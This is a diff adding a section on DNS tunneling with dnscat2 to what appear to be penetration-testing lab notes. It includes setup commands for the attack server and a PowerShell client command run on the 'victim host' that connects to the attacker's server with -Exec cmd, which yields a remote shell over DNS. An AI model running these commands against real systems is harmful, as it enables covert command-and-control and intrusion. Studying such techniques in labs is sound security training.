@@ -186,5 +186,37 @@ netsh.exe interface portproxy show v4tov4
 # DNS Tunneling with Dnscat2
 
 ```bash
+# setup
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+sudo apt update
+sudo apt install ruby ruby-dev libffi-dev build-essential
+gem install bundler
+bundle install
 
+# start dnscat2 server (attack host)
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+```
+
+**dnscat2 Client Authentication**
+
+- Start the **dnscat2 server** → it generates a **secret key**.
+- Provide this key to the **Windows dnscat2 client** to authenticate and encrypt tunnel traffic.
+- On Windows, use either:
+    - **dnscat2 client** from the main project
+    - **dnscat2-powershell** — PowerShell-based compatible client (provided link below)
+- Transfer the client to the Windows target and connect it to the external dnscat2 server.
+
+```powershell
+# victim host - dnscat2-powershell
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+Import-Module .\dnscat2.ps1
+
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+
+```bash
+# Interacting with the Established Session
+dnscat2> window -i 1
 ```
